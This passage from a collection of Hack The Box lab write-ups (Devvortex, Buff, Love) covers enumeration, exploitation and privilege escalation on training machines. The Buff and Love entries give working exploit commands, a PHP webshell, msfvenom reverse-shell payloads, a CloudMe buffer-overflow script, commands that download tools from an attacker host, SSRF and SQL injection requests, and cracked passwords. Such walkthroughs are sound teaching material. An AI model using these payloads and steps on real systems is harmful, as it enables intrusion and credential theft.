class=\"language-bash\">echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' &gt; hash.txt\nhashcat hash.txt /usr/share/wordlists/rockyou.txt -m 3200\n</code></pre>\n<pre><code class=\"language-text\">Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))\n$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho\nStatus...........: Cracked\n</code></pre>\n<p><strong>Cracked:</strong> <code>logan</code> → <code>tequieromucho</code></p>\n<h3 id=\"ssh-as-logan\">SSH as logan</h3>\n<pre><code class=\"language-bash\">ssh logan@devvortex.htb\n# Password: tequieromucho\n</code></pre>\n<p><strong>User flag</strong> obtained.</p>\n<hr>\n<h2 id=\"privilege-escalation-cve-2023-1326-apport-cli\">Privilege Escalation // CVE-2023-1326 (apport-cli)</h2>\n<h3 id=\"sudo-l\">sudo -l</h3>\n<pre><code class=\"language-bash\">logan@devvortex:~$ sudo -l\nUser logan may run the following commands on devvortex:\n    (ALL : ALL) /usr/bin/apport-cli\n</code></pre>\n<h3 id=\"cve-2023-1326-apport-cli-pager-escape\">CVE-2023-1326 // apport-cli Pager Escape</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>apport-cli 2.26.0 and earlier</strong> — When invoked with <code>sudo</code>, apport-cli uses <code>less</code> as a pager to display reports. Since <code>less</code> allows shell escape via the <code>!</code> command, a user can obtain a root shell.</p>\n<p>Ref: https://nvd.nist.gov/vuln/detail/CVE-2023-1326\nPoC: https://github.com/diego-tella/CVE-2023-1326-PoC</p>\n<p><strong>Root cause:</strong> <code>apport-cli</code> invokes an interactive pager (<code>less</code>) inheriting root privileges from sudo. <code>less</code> allows execution of arbitrary commands with <code>!command</code>, providing a shell with the parent process's permissions — root.</p>\n</blockquote>\n<h3 id=\"exploitation\">Exploitation</h3>\n<pre><code class=\"language-bash\">sudo /usr/bin/apport-cli -f\n# 1: Display (X.org)\n# 2: Freezes or hangs during boot or usage\n# (press key to continue)\n# V: View report\n# → opens less as root\n# type: !/bin/bash\n</code></pre>\n<pre><code class=\"language-text\">root@devvortex:/home/logan# whoami\nroot\n</code></pre>\n<p><strong>Root flag</strong> obtained.</p>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code class=\"language-text\">Nmap → devvortex.htb (redirect) → VHost fuzzing → dev.devvortex.htb\n       ↓\n  Joomla CMS → CVE-2023-23752 (API info disclosure) → DB creds lewis\n       ↓\n  Admin login → Webshell plugin upload → RCE www-data\n       ↓\n  busybox nc reverse shell → Shell stabilization\n       ↓\n  MySQL dump → bcrypt hash logan → hashcat -m 3200 → tequieromucho\n       ↓\n  SSH logan → user.txt\n       ↓\n  sudo apport-cli → CVE-2023-1326 pager escape → root\n\n## Lessons Learned\n\n- **Subdomain vs VHost fuzzing:** In environments without real DNS (HTB, internal labs), subdomain fuzzing via DNS is useless. VHost fuzzing via HTTP (`Host: FUZZ.domain`) is the only way to discover virtual hosts on the same IP. This distinction is fundamental.\n- **busybox as fallback:** When `nc` is the OpenBSD version (without `-c`/`-e`), `busybox nc` is a reliable alternative already present on many systems.\n- **API info disclosure:** CMS REST APIs (Joomla, WordPress) are often a goldmine of information — always enumerate them.\n- **hashcat autodetect:** If `-m` is not specified, hashcat attempts autodetect but asks for confirmation. For bcrypt (`$2y$`), always use `-m 3200`.\n- **Pager escape:** Any tool that invokes a pager (`less`, `more`, `man`) as root is a potential privilege escalation vector — always check GTFOBins.\n\n## Timeline\n\n- **Total time:** ~2 hours\n- **Where I spent most time:** Reverse shell — multiple attempts with `nc` and bash before finding `busybox nc`\n- **Subjective difficulty:** 4/10\n</code></pre>"
    },
    {
      "title": "Buff",
      "slug": "buff",
      "date": "2026·02·26",
      "tags": [
        "htb",
        "easy",
        "windows",
        "gymmanagementsystem",
        "file-upload",
        "rce"
      ],
      "desc": "Note A single open port — the entire machine revolves around the web application on 8080.",
      "body": "<h1 id=\"buff-hack-the-box\">Buff // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Windows 10 (17134.1610)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.25.107</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>buff.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>HTTP/Apache (8080)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">nmap -sC -sV -p- -vvv -oA scan/nmap.scan buff.htb\n</code></pre>\n<pre><code class=\"language-text\">PORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache httpd 2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6\n|_http-title: mrb3n's Bro Hut\n</code></pre>\n<blockquote>\n<p><strong>Note</strong><br>\nA single open port — the entire machine revolves around the web application on 8080.</p>\n</blockquote>\n<h3 id=\"web-application-gym-management-system\">Web Application // Gym Management System</h3>\n<p>The site is <strong>mrb3n's Bro Hut</strong>, a gym. Navigating the pages identifies the software: <strong>Gym Management System 1.0</strong> (projectworlds.in).</p>\n<h3 id=\"found-credentials\">Found Credentials</h3>\n<p>File <code>New Text Document.txt</code> in <code>C:\\xampp\\htdocs\\gym\\</code>:</p>\n<pre><code class=\"language-text\">$mysql_host = &quot;mysql16.000webhost.com&quot;;\n$mysql_database = &quot;a8743500_secure&quot;;\n$mysql_user = &quot;a8743500_secure&quot;;\n$mysql_password = &quot;ipad12345&quot;;\n</code></pre>\n<hr>\n<h2 id=\"foothold\">Foothold</h2>\n<h3 id=\"rce-gym-management-system-unauthenticated-upload\">RCE // Gym Management System Unauthenticated Upload</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Gym Management System 1.0</strong> — Unauthenticated upload on <code>/upload.php</code> with filter bypass (double extension + Content-Type + magic bytes PNG).</p>\n<p>Ref: https://www.exploit-db.com/exploits/48506</p>\n<p>See also: WebServices</p>\n</blockquote>\n<pre><code class=\"language-bash\">python2 48506.py http://buff.htb:8080/\n</code></pre>\n<pre><code class=\"language-text\">[+] Successfully connected to webshell.\nC:\\xampp\\htdocs\\gym\\upload&gt; whoami\nbuff\\shaun\n</code></pre>\n<p>The exploit loads a PHP webshell with <code>.php.png</code> extension, PNG magic bytes, and <code>image/png</code> Content-Type in <code>/upload/</code>.</p>\n<blockquote>\n<p><strong>How the exploit works — analysis of upload.php</strong>  </p>\n<p><strong>1. No authentication</strong> — <code>/upload.php</code> does not verify the user session.</p>\n<p><strong>2. Filename controlled by attacker</strong> — the <code>id</code> parameter becomes the filename:\n<code>php\n$user = $_GET['id'];\nmove_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\". $user.\".\".$ext);</code></p>\n<p><strong>3. Extension whitelist bypass</strong> — the filter checks only the last extension:\n<code>php\n$allowedExts = array(\"jpg\", \"jpeg\", \"gif\", \"png\", \"JPG\");\n$extension = @end(explode(\".\", $_FILES[\"file\"][\"name\"]));</code>\nThe file <code>kaio-ken.php.png</code> passes the check because <code>end()</code> returns <code>png</code>.</p>\n<p><strong>4. Content-Type bypass</strong> — the server verifies the MIME type in the request header:\n<code>php\nif ($_FILES[\"file\"][\"type\"] == \"image/png\")</code>\nSimply set <code>Content-Type: image/png</code> in the form-data.</p>\n<p><strong>5. The rename trick</strong> — the server renames the file using the <strong>second</strong> element of the array (index <code>1</code>):\n<code>php\n$pic = $_FILES[\"file\"][\"name\"];        // \"kaio-ken.php.png\"\n$conv = explode(\".\", $pic);            // ['kaio-ken', 'php', 'png']\n$ext = $conv['1'];                     // 'php' ← not 'png'!</code>\nThe final file becomes <code>kamehameha.php</code> — executable by the server.</p>\n<p><strong>6. Webshell</strong> — accessible at <code>/upload/kamehameha.php?telepathy=whoami</code></p>\n</blockquote>\n<h3 id=\"stabilized-shell\">Stabilized Shell</h3>\n<p>From the webshell, transfer netcat and obtain a reverse shell (see FileTransfer):</p>\n<pre><code class=\"language-cmd\">curl.exe -o C:\\xampp\\nc.exe http://&lt;ATTACKER_IP&gt;:8000/nc.exe\nC:\\xampp\\nc.exe &lt;ATTACKER_IP&gt; 443 -e powershell\n</code></pre>\n<pre><code class=\"language-bash\">rlwrap nc -nvlp 443\n</code></pre>\n<hr>\n<h2 id=\"user\">User</h2>\n<p>Shell as <code>buff\\shaun</code>. User flag in <code>C:\\Users\\shaun\\Desktop\\user.txt</code>.</p>\n<h2 id=\"privilege-escalation\">Privilege Escalation</h2>\n<h3 id=\"internal-port-enumeration-cloudme-1112\">Internal Port Enumeration // CloudMe 1.11.2</h3>\n<blockquote>\n<p>See also: PortForwarding and PrivilegeEscalationWindows</p>\n</blockquote>\n<p><code>CloudMe_1112.exe</code> is present in <code>C:\\Users\\shaun\\Downloads\\</code>.</p>\n<blockquote>\n<p><strong>netstat vs nmap</strong><br>\n<code>netstat -ano</code> did not show port 8888 because CloudMe is started by a scheduled task and is not always active. nmap via Ligolo, taking longer, intercepted a cycle where the service was running. When looking for intermittent services, a single <code>netstat</code> may not be enough — repeating it or using <code>tasklist</code> to find the process is more reliable.</p>\n</blockquote>\n<p>Checking listening ports on localhost via nmap reveals <strong>port 8888</strong> — the CloudMe Sync service.</p>\n<h4 id=\"port-forwarding-with-ligolo-ng\">Port forwarding with Ligolo-ng</h4>\n<p>Setup of the tunnel to reach internal services:</p>\n<pre><code class=\"language-bash\"># Attacker: create TUN interface and start proxy\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\nligolo-proxy -selfcert -laddr 0.0.0.0:11601\n</code></pre>\n<pre><code class=\"language-cmd\">:: Target: download and start agent\ncurl.exe -o C:\\xampp\\ligolo-agent.exe http://&lt;ATTACKER_IP&gt;:8000/ligolo-agent.exe\nC:\\xampp\\ligolo-agent.exe -connect &lt;ATTACKER_IP&gt;:11601 -ignore-cert\n</code></pre>\n<pre><code class=\"language-text\">ligolo-ng » session\n? Specify a session: 1 - buff\\shaun@BUFF\n[Agent : buff\\shaun@BUFF] » start\n</code></pre>\n<pre><code class=\"language-bash\"># Attacker: add route for target's localhost\nsudo ip route add 240.0.0.1/32 dev ligolo\n</code></pre>\n<h4 id=\"internal-nmap-via-ligolo\">Internal Nmap via Ligolo</h4>\n<pre><code class=\"language-bash\">nmap 240.0.0.1 --top-ports=1000 -sV -sC -vvv\n</code></pre>\n<pre><code class=\"language-text\">PORT     STATE SERVICE      VERSION\n135/tcp  open  msrpc        Microsoft Windows RPC\n445/tcp  open  microsoft-ds?\n3306/tcp open  mysql        MariaDB 5.5.5-10.4.11\n8080/tcp open  http         Apache httpd 2.4.43\n8888/tcp open  sun-answerbook?\n</code></pre>\n<blockquote>\n<p><strong>Port 8888</strong><br>\nNot visible from outside — listening only on localhost. It is the <strong>CloudMe Sync 1.11.2</strong> service, vulnerable to buffer overflow.</p>\n</blockquote>\n<h3 id=\"cloudme-1112-buffer-overflow\">CloudMe 1.11.2 // Buffer Overflow</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>CloudMe Sync 1.11.2</strong> — Buffer overflow allowing arbitrary code execution. The exploit overwrites the return address with a ROP gadget (PUSH ESP / RET) and jumps to the injected shellcode.</p>\n<p>Ref: https://www.exploit-db.com/exploits/48389</p>\n</blockquote>\n<h4 id=\"step-1-generate-shellcode-with-msfvenom\">Step 1 // Generate shellcode with msfvenom</h4>\n<pre><code class=\"language-bash\">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=4444 \\\n  -b '\\x00\\x0a\\x0d' \\\n  -e x86/shikata_ga_nai \\\n  -f python -v buf\n</code></pre>\n<blockquote>\n<p><strong>msfvenom parameters</strong><br>\n- <strong><code>-b '\\x00\\x0a\\x0d'</code></strong> — Bad characters to exclude: null byte (<code>\\x00</code>), line feed (<code>\\x0a</code>), carriage return (<code>\\x0d</code>). These bytes interrupt payload copying in memory (terminate strings or lines in the protocol) and would corrupt the exploit.\n- <strong><code>-e x86/shikata_ga_nai</code></strong> — Polymorphic encoder: obfuscates the payload so it does not contain bad characters and changes signature on each generation. Also useful for basic AV evasion (not always sufficient).\n- <strong><code>-f python -v buf</code></strong> — Output in Python format with variable <code>buf</code>, ready to paste into the exploit script.</p>\n</blockquote>\n<h4 id=\"step-2-modify-the-exploit\">Step 2 // Modify the exploit</h4>\n<p>In script <code>48389.py</code>, modify target and payload:</p>\n<pre><code class=\"language-python\">import socket, sys\n\ntarget = &quot;240.0.0.1&quot;  # was 127.0.0.1 — now via Ligolo\n\npayload  = b&quot;\\x90&quot; * 1052\npayload += b&quot;\\xB5\\x42\\xA8\\x68&quot;  # ROP: PUSH ESP / RET (0x68A842B5)\npayload += b&quot;\\x90&quot; * 30          # NOP sled\n\n# msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=4444\n#   -b '\\x00\\x0a\\x0d' -e x86/shikata_ga_nai -f python -v buf\nbuf  = b&quot;&quot;\nbuf += b&quot;\\xda\\xcd\\xd9\\x74\\x24\\xf4...&quot;  # generated shellcode\n# ... (full payload from msfvenom)\n\npayload += buf\n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target, 8888))\n    s.send(payload)\nexcept Exception as e:\n    print(sys.exc_value)\n</code></pre>\n<p>The port is already correct in the script:</p>\n<pre><code class=\"language-python\">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target, 8888))\ns.send(buf)\n</code></pre>\n<p>The exploit sends 1052 bytes of padding + ROP gadget (<code>0x68A842B5</code> — PUSH ESP / RET) + NOP sled + shellcode to port 8888.</p>\n<h4 id=\"step-3-execute-and-gain-administrator\">Step 3 // Execute and gain Administrator</h4>\n<pre><code class=\"language-bash\"># Attacker: listener\nnc -nvlp 4444\n</code></pre>\n<pre><code class=\"language-bash\"># Attacker: launch exploit via Ligolo tunnel\npython3 48389.py\n</code></pre>\n<pre><code class=\"language-text\">connect to [&lt;ATTACKER_IP&gt;] from (UNKNOWN) [10.129.10.59] 49685\n\nC:\\Windows\\system32&gt; whoami\nbuff\\administrator\n</code></pre>\n<p>Root flag in <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<p>```text\nNmap → single port 8080 (Apache + PHP)\n    │\n    ↓\nWeb enum → Gym Management System 1.0\n    │\n    ↓\nExploit 48506.py → upload webshell (.php.png + magic bytes)\n    │  RCE like buff\\shaun\n    ↓\ncurl.exe + nc.exe → stabilized reverse shell → user flag\n    │\n    ↓\nInternal enum → CloudMe_1112.exe in Downloads + port 8888 on localhost\n    │\n    ↓\nLigolo-ng tunnel → 240.0.0.1:8888 reachable from attacker\n    │\n    ↓\nCloudMe 1.11.2 buffer overflow (48389.py)\n    │  msfvenom shellcode + shikata_ga_nai encoder\n    ↓\nbuff\\administrator → root flag</p>"
    },
    {
      "title": "Love",
      "slug": "love",
      "date": "2026·02·25",
      "tags": [
        "htb",
        "easy",
        "windows",
        "ssrf",
        "votingsystem",
        "sqli"
      ],
      "desc": "Info from the SSL certificate (port 443) - CN: staging.love.htb — new vhost - Email: roy@love.htb — first user found - Org: ValentineCorp",
      "body": "<h1 id=\"love-hack-the-box\">Love // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Windows 10 Pro 19042</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.48.103</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>love.htb, staging.love.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>HTTP/Apache (80,443,5000), SMB (445), MySQL/MariaDB (3306), WinRM (5985,5986), MSRPC (135)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">nmap -sC -sV -p- -vvv -oA scan/nmap.scan love.htb\n</code></pre>\n<pre><code class=\"language-text\">PORT      STATE SERVICE      VERSION\n80/tcp    open  http         Apache httpd 2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: Voting System using PHP\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n443/tcp   open  ssl/http     Apache httpd 2.4.46\n|_http-title: 400 Bad Request\n| ssl-cert: Subject: commonName=staging.love.htb/emailAddress=roy@love.htb\n|   organizationName=ValentineCorp\n445/tcp   open  microsoft-ds Windows 10 Pro 19042\n3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)\n5000/tcp  open  http         Apache httpd 2.4.46\n|_http-title: 403 Forbidden\n5040/tcp  open  unknown\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)\n5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (WinRM-S)\n7680/tcp  open  pando-pub?\n</code></pre>\n<blockquote>\n<p><strong>Info from the SSL certificate (port 443)</strong><br>\n- <strong>CN:</strong> staging.love.htb — new vhost\n- <strong>Email:</strong> <code>roy@love.htb</code> — first user found\n- <strong>Org:</strong> ValentineCorp</p>\n</blockquote>\n<h3 id=\"vhost-enumeration\">VHost Enumeration</h3>\n<blockquote>\n<p>See also: WebServices</p>\n</blockquote>\n<pre><code class=\"language-bash\">ffuf -H &quot;Host: FUZZ.love.htb&quot; \\\n     -H &quot;User-Agent: PENTEST&quot; \\\n     -c \\\n     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n     -u http://love.htb/ \\\n     -fs 4388\n</code></pre>\n<pre><code class=\"language-text\">staging                 [Status: 200, Size: 5357, Words: 1543, Lines: 192]\n</code></pre>\n<p>Added to <code>/etc/hosts</code>:</p>\n<pre><code class=\"language-bash\">sudo tee -a /etc/hosts &lt;&lt;&lt; &quot;10.129.48.103  staging.love.htb&quot;\n</code></pre>\n<blockquote>\n<p><strong>The SSL certificate already confirmed <code>staging.love.htb</code>, but vhost fuzzing with ffuf is the correct way to discover it without relying on the certificate.</strong>  </p>\n</blockquote>\n<p>SMB signing not required:</p>\n<pre><code class=\"language-text\">| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled but not required\n</code></pre>\n<blockquote>\n<p><strong>Port 5000</strong><br>\nReturns <strong>403 Forbidden</strong> from outside — accessible only from localhost (relevant for SSRF).</p>\n</blockquote>\n<h3 id=\"directory-bruteforce-lovehtb\">Directory Bruteforce // love.htb</h3>\n<pre><code class=\"language-bash\">feroxbuster -u http://love.htb/ -x js,html,php,txt,json,docx -o scan/root.dir\n</code></pre>\n<p>Relevant results:</p>\n<table>\n<thead>\n<tr>\n<th>Status</th>\n<th>Path</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>200</td>\n<td><code>/</code> (Voting System login)</td>\n</tr>\n<tr>\n<td>301</td>\n<td><code>/admin/</code></td>\n</tr>\n<tr>\n<td>301</td>\n<td><code>/images/</code></td>\n</tr>\n<tr>\n<td>301</td>\n<td><code>/includes/</code></td>\n</tr>\n<tr>\n<td>301</td>\n<td><code>/plugins/</code></td>\n</tr>\n<tr>\n<td>302</td>\n<td><code>/login.php</code> → <code>index.php</code></td>\n</tr>\n<tr>\n<td>302</td>\n<td><code>/home.php</code> → <code>index.php</code></td>\n</tr>\n<tr>\n<td>302</td>\n<td><code>/admin/login.php</code> → <code>index.php</code></td>\n</tr>\n<tr>\n<td>0</td>\n<td><code>/includes/conn.php</code> (DB connection)</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong>Application</strong><br>\n<strong>Voting System using PHP</strong> — admin panel at <code>/admin/</code>, login at <code>index.php</code>.</p>\n</blockquote>\n<h3 id=\"sqli-on-voting-system-not-necessary\">SQLi on Voting System (not necessary)</h3>\n<p>sqlmap confirmed a <strong>time-based blind SQLi</strong> on the <code>voter</code> parameter of the login form:</p>\n<pre><code class=\"language-text\">Parameter: #1* ((custom) POST)\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: voter=' AND (SELECT 2697 FROM (SELECT(SLEEP(5)))NKid) AND 'vZkn'='vZkn&amp;password=asd&amp;login=\n</code></pre>\n<blockquote>\n<p><strong>Note</strong><br>\nThe SQLi is real but <strong>not the optimal path</strong>: time-based blind extraction is slow (one character at a time). Admin credentials are obtained much faster via SSRF.</p>\n</blockquote>\n<hr>\n<h2 id=\"foothold\">Foothold</h2>\n<h3 id=\"ssrf-on-staginglovehtb-admin-credentials-leak\">SSRF on staging.love.htb // Admin credentials leak</h3>\n<blockquote>\n<p>See also: WebServices</p>\n</blockquote>\n<p>The vhost <code>staging.love.htb</code> (found in the SSL certificate) exposes a <strong>Free File Scanner</strong> with the <code>/beta.php</code> endpoint that accepts arbitrary URLs and displays their content (SSRF).</p>\n<h4 id=\"step-1-internal-port-scan-via-ssrf\">Step 1 // Internal port scan via SSRF</h4>\n<p>Port fuzzing of local ports using Burp Intruder:</p>\n<pre><code class=\"language-http\">POST /beta.php HTTP/1.1\nHost: staging.love.htb\nContent-Type: application/x-www-form-urlencoded\n\nfile=http://127.0.0.1:§PORT§/&amp;read=Scan+file\n</code></pre>\n<p>Port <strong>5000</strong> (403 from outside) returns content when accessed from localhost.</p>\n<h4 id=\"step-2-access-to-localhost5000\">Step 2 // Access to localhost:5000</h4>\n<pre><code class=\"language-http\">POST /beta.php HTTP/1.1\nHost: staging.love.htb\nContent-Type: application/x-www-form-urlencoded\n\nfile=http://127.0.0.1:5000/&amp;read=Scan+file\n</code></pre>\n<p>The response contains a <strong>Password Dashboard</strong> with plaintext credentials:</p>\n<pre><code class=\"language-text\">Vote Admin Creds admin: @LoveIsInTheAir!!!!\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Username</th>\n<th>Password</th>\n<th>Service</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>admin</code></td>\n<td><code>@LoveIsInTheAir!!!!</code></td>\n<td>Voting System (<code>/admin/</code>)</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"step-3-login-to-admin-panel\">Step 3 // Login to admin panel</h4>\n<p>Access to <code>http://love.htb/admin/login.php</code> with <code>admin</code> : <code>@LoveIsInTheAir!!!!</code> → landing on <code>http://love.htb/admin/home.php</code>.</p>\n<h3 id=\"rce-via-file-upload-voting-system\">RCE via File Upload // Voting System</h3>\n<p>The Voting System admin panel allows uploading a profile image in <code>/admin/profile_update.php</code>. There is no file type validation → <strong>PHP webshell upload</strong>.</p>\n<h4 id=\"step-1-webshell-upload\">Step 1 // Webshell upload</h4>\n<p>From the admin panel, click on the username (\"Neovic Devierte\") to access the profile update. Upload a webshell as the profile picture:</p>\n<pre><code class=\"language-php\">&lt;?php system($_REQUEST['cmd']);?&gt;\n</code></pre>\n<p>The file is saved in <code>/images/pwn.php</code>.</p>\n<h4 id=\"step-2-rce-confirmation\">Step 2 // RCE confirmation</h4>\n<p>Test callback with curl:</p>\n<pre><code class=\"language-text\">GET /images/pwn.php?cmd=curl+&lt;ATTACKER_IP&gt; HTTP/1.1\nHost: love.htb\n</code></pre>\n<pre><code class=\"language-bash\">┌──(sverz1㉿sverz1)-[~/…/HTB/Machines/Easy/Love]\n└─$ nc -nvlp 80\nlistening on [any] 80 ...\nconnect to [&lt;ATTACKER_IP&gt;] from (UNKNOWN) [10.129.48.103] 55620\nGET / HTTP/1.1\nHost: &lt;ATTACKER_IP&gt;\nUser-Agent: curl/7.55.1\nAccept: */*\n</code></pre>\n<p>RCE confirmed.</p>\n<h4 id=\"step-3-reverse-shell\">Step 3 // Reverse shell</h4>\n<p>Base64 PowerShell reverse shell (<code>powershell -e &lt;B64&gt;</code>):</p>\n<pre><code class=\"language-text\">GET /images/pwn.php?cmd=powershell+-e+&lt;BASE64_PAYLOAD&gt; HTTP/1.1\nHost: love.htb\n</code></pre>\n<pre><code class=\"language-text\">┌──(sverz1㉿sverz1)-[~/…/HTB/Machines/Easy/Love]\n└─$ nc -nvlp 80\nlistening on [any] 80 ...\nconnect to [&lt;ATTACKER_IP&gt;] from (UNKNOWN) [10.129.48.103] 55624\nwhoami\nlove\\phoebe\nPS C:\\xampp\\htdocs\\omrs\\images&gt;\n</code></pre>\n<hr>\n<p>Shell like <code>love\\phoebe</code>. User flag in <code>C:\\Users\\phoebe\\Desktop\\user.txt</code>.</p>\n<h2 id=\"privilege-escalation\">Privilege Escalation</h2>\n<h3 id=\"alwaysinstallelevated-system\">AlwaysInstallElevated → SYSTEM</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>AlwaysInstallElevated</strong> — when both registry keys (HKLM and HKCU) are set to <code>1</code>, any user can install <code>.msi</code> packages with <strong>NT AUTHORITY\\SYSTEM</strong> privileges. It is sufficient to generate a malicious MSI with msfvenom.</p>\n<p>See also: PrivilegeEscalationWindows\nRef: https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/</p>\n</blockquote>\n<h4 id=\"step-1-check-registry-keys\">Step 1 // Check registry keys</h4>\n<pre><code class=\"language-powershell\">PS C:\\&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n\nPS C:\\&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\nHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n</code></pre>\n<p>Both at <code>0x1</code> → <strong>exploitable</strong>.</p>\n<h4 id=\"step-2-generate-malicious-msi\">Step 2 // Generate malicious MSI</h4>\n<pre><code class=\"language-bash\">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=443 -f msi -o evil.msi\n</code></pre>\n<h4 id=\"step-3-transfer-to-target\">Step 3 // Transfer to target</h4>\n<pre><code class=\"language-bash\"># Attacker: HTTP server\npython3 -m http.server 9999\n</code></pre>\n<pre><code class=\"language-powershell\"># Target: download\n(New-Object Net.WebClient).DownloadFile('http://&lt;ATTACKER_IP&gt;:9999/evil.msi','C:\\Users\\Phoebe\\Documents\\evil.msi')\n</code></pre>\n<h4 id=\"step-4-execute-and-get-system\">Step 4 // Execute and get SYSTEM</h4>\n<pre><code class=\"language-bash\"># Attacker: listener\nnc -nvlp 443\n</code></pre>\n<pre><code class=\"language-powershell\"># Target: install silently\nmsiexec /quiet /qn /i C:\\Users\\Phoebe\\Documents\\evil.msi\n</code></pre>\n<pre><code class=\"language-text\">C:\\WINDOWS\\system32&gt; whoami\nnt authority\\system\n</code></pre>\n<p>Root flag in <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>\n<h4 id=\"alternative-privesc-without-reverse-shell\">Alternative // Privesc without reverse shell</h4>\n<p>You can use an MSI that executes a direct command (e.g., adding the user to the Administrators group) instead of a reverse shell:</p>\n<pre><code class=\"language-bash\">msfvenom -p windows/exec CMD='net localgroup administrators phoebe /add' -f msi -o adduser.msi\n</code></pre>\n<p>Transfer and execute with <code>msiexec /quiet /qn /i adduser.msi</code>, then <strong>logout and new login</strong> to gain admin privileges.</p>\n<blockquote>\n<p><strong>Logout is required</strong><br>\nAfter adding the user to the Administrators group, the new privileges are not active in the current session. You must disconnect and reconnect (e.g., new evil-winrm session or new reverse shell).</p>\n</blockquote>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code class=\"language-text\">Nmap → SSL certificate reveals roy@love.htb\n    │  ffuf vhost fuzzing → staging.love.htb\n    │\n    ↓\nstaging.love.htb/beta.php → SSRF (File Scanner)\n    │  Internal port fuzzing via Intruder\n    ↓\nSSRF on http://127.0.0.1:5000/ → Password Dashboard\n    │  admin : @LoveIsInTheAir!!!!\n    ↓\nLogin Voting System /admin/ → admin panel\n    │\n    ↓\nUpload PHP webshell via profile picture → /images/pwn.php\n    │  RCE confirmed with curl callback\n    ↓\nReverse shell PowerShell base64 → love\\phoebe → user flag\n    │\n    ↓\nAlwaysInstallElevated (HKLM + HKCU = 0x1)\n    │  msfvenom MSI reverse shell → msiexec /quiet /qn /i\n    ↓\nNT AUTHORITY\\SYSTEM → root flag\n</code></pre>"
    },
    {
      "title": "Mailing",
      "slug": "mailing",
      "date": "2026·02·20",
      "tags": [
        "htb",
        "easy",
        "windows",
        "hmailserver",
        "lfi",
        "cve-2024-21413"
      ],
      "desc": "Info from SSL certificate The certificate on port 465/587/993 reveals: - CN: mailing.htb - Email: ruy@mailing.htb — first user found - Org: Mailing Ltd, Madrid, Spain",
